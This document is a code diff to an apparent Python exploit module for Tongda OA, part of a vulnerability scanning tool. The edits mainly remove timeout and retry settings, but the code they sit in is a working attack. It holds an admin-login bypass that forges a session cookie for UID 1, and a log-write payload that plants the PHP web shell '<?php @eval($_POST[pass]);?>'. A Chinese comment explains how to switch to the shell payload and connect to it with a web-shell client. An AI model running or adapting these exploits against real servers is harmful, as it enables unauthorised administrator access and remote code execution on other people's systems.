@@ -12,12 +12,9 @@ class Tongda():
         self.cmd = env.get('cmd')
         self.pocname = env.get('pocname')
         self.vuln = env.get('vuln')
-        self.timeout = int(env.get('timeout'))
-        self.retry_time = int(env.get('retry_time'))
-        self.retry_interval = int(env.get('retry_interval'))
         self.flag = GlobalVar.get_value('flag')
-        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo {}'.format(self.flag))
-        self.linux_cmd = env.get('cmd', 'echo {}'.format(self.flag))
+        self.win_cmd = 'cmd /c '+ env.get('cmd', 'echo '+self.flag)
+        self.linux_cmd = env.get('cmd', 'echo '+self.flag)
 
     def AnyAdministratorAccountToLogIn(self):
         appName = 'Tongda'
@@ -31,15 +28,15 @@ class Tongda():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
         try:
-            res = exprequest.get(self.url+path1, timeout=self.timeout, verify=False)
+            res = exprequest.get(self.url+path1)
             restext = str(res.text).split('{')
             codeuid = restext[-1].replace('}"}', '').replace('\r\n', '')
-            resp = exprequest.post(self.url+path2, data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)}, timeout=self.timeout, verify=False)
+            resp = exprequest.post(self.url+path2, data={'CODEUID': '{'+codeuid+'}', 'UID': int(1)})
             head = resp.headers.get('Set-Cookie').replace('path=/', '')
 
-            resp2 = exprequest.get(self.url+path3,headers={"Cookie":head}, timeout=self.timeout, verify=False)
+            resp2 = exprequest.get(self.url+path3,headers={"Cookie":head})
             code = resp2.status_code
             con = resp2.text
 
@@ -64,7 +61,7 @@ class Tongda():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
             if self.vuln == 'False':
@@ -72,9 +69,9 @@ class Tongda():
                 payload_rm = rm + "MedusaScanTestPoc"
                 payload_test = "/ispirit/interface/gateway.php?" + payload_rm
                 #把随机数写到log文件中想要写入木马把payload_test替换成payload_shell即可，用菜刀连接payload_url这个连接即可，需要改成GBK
-                resp = exprequest.get(self.url+payload_test ,timeout=self.timeout, verify=False)
+                resp = exprequest.get(self.url+payload_test)
                 #请求文件查看是否成功，是否写入
-                resp2 = exprequest.get(self.url+path ,timeout=self.timeout, verify=False)
+                resp2 = exprequest.get(self.url+path)
                 con = resp2.text
                 code2 = resp2.status_code
                 code = resp.status_code
@@ -86,8 +83,8 @@ class Tongda():
                     return output.fail()
             else:
                 payload_shell = "/ispirit/interface/gateway.php?<?php @eval($_POST[pass]);?>"
-                resp = exprequest.get(self.url+payload_shell ,timeout=self.timeout, verify=False)
-                resp = exprequest.get(self.url+path ,timeout=self.timeout, verify=False)
+                resp = exprequest.get(self.url+payload_shell)
+                resp = exprequest.get(self.url+path)
                 print(resp.text)
         except Exception as error:
             return output.error_output(str(error))
@@ -103,7 +100,7 @@ class Tongda():
         #输出类
         output = Output(self.url, appName, pocname)
         #请求类
-        exprequest = ExpRequest(pocname, output)
+        exprequest = ExpRequest(output)
 
         try:
             if self.vuln == 'False':
